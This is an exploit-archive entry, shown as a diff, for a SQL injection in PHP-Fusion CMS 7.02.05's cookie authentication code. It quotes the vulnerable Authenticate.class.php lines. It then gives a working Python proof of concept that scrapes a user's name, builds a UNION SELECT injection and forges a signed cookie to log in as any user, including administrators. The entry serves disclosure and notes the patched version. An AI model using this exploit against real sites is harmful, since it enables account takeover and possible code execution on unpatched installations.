@@ -1,0 +1,66 @@
+id: 20397
+date: 02/19/2013
+title: PHP-Fusion CMS 7.02.05 SQL Injection Vulnerability
+author: Krzysztof Kotowicz
+cves: 
+
+SQL Injection vulnerability exists in releases since 7.02.01 till 7.02.05 of PHP-Fusion CMS. The vulnerability allows the attacker to authenticate as an arbitrary user and act with its rights which might lead to the code execution. Because of exploitation simplicity, the potential risk is very high. Magic Quotes feature protects against this coding flaw. Version 7.02.06 fixes presented security problem.
+
+Affected file: includes/classes/Authenticate.class.php
+023: define("COOKIE_USER", COOKIE_PREFIX."user");
+024: define("COOKIE_ADMIN", COOKIE_PREFIX."admin");
+147: $cookieDataArr = explode(".", $_COOKIE[COOKIE_USER]);
+150: list($userID, $cookieExpiration, $cookieHash) = $cookieDataArr;
+153: $result = dbquery(
+154:     "SELECT * FROM ".DB_USERS."
+155:     WHERE user_id='".$userID."' AND user_status='0' AND user_actiontime='0'
+156:     LIMIT 1"
+157: );
+195: $cookieDataArr = explode(".", $_COOKIE[COOKIE_ADMIN]);
+197: list($userID, $cookieExpiration, $cookieHash) = $cookieDataArr;
+200: $result = dbquery(
+201:     "SELECT user_admin_algo, user_admin_salt FROM ".DB_USERS."
+202:     WHERE user_id='".$userID."' AND user_level>101 AND  user_status='0' AND user_actiontime='0'
+203:     LIMIT 1"
+204: );
+
+# Proof of Concept
+# PHP-Fusion 7.02.05
+# Authentication spoofing
+# Author: vnd at vndh.net
+from http import client
+from time import time
+import hashlib
+import hmac
+import re
+
+def generateCookie(address, path, userid, password = 'admin'):
+  connection = client.HTTPConnection(address)
+  connection.request("GET", "%s/profile.php?lookup=%d" % (path, userid))
+  response = connection.getresponse()
+  if response.status != 200: raise BaseException("bad status")
+  cookies = response.getheader("Set-Cookie")
+  pattern = re.compile("([A-Z0-9\_]+)lastvisit", re.IGNORECASE)
+  cookiesearch = pattern.search(cookies)
+  if cookiesearch == None: raise BaseException("bad cookie")
+  cookiename = cookiesearch.groups()
+  cookiename = "%suser" % cookiename[0]
+  source = response.read()
+  connection.close()
+  source = source.decode("utf-8")
+  pattern = re.compile("<!--profile_user_name-->(.*)<")
+  username = pattern.search(source).groups()
+  username = username[0]
+
+  injection = "-1' union select %d,'%s','sha256','','%s'%s,101%s -- " % (userid, username, password, ",0" * 15,",0" * 12)
+  expiration = str(int(time() + 86400))
+  userhash = ""
+  userhash = hmac.new(bytes(userhash.encode("utf-8")), bytes(("%s%s" % (injection, expiration)).encode("utf-8")), hashlib.sha256).hexdigest()
+  userhash = hmac.new(bytes(userhash.encode("utf-8")), bytes(("%s%s" % (injection, expiration)).encode("utf-8")), hashlib.sha256).hexdigest()
+
+  return (cookiename, ".".join([injection, expiration, userhash]))
+
+Reference: https://vndh.net/note:php-fusion-70205-sql-injection
+Patched version: http://www.php-fusion.co.uk/downloads.php?cat_id=23&download_id=264
+
+#  0day.today [2023-03-25]  #
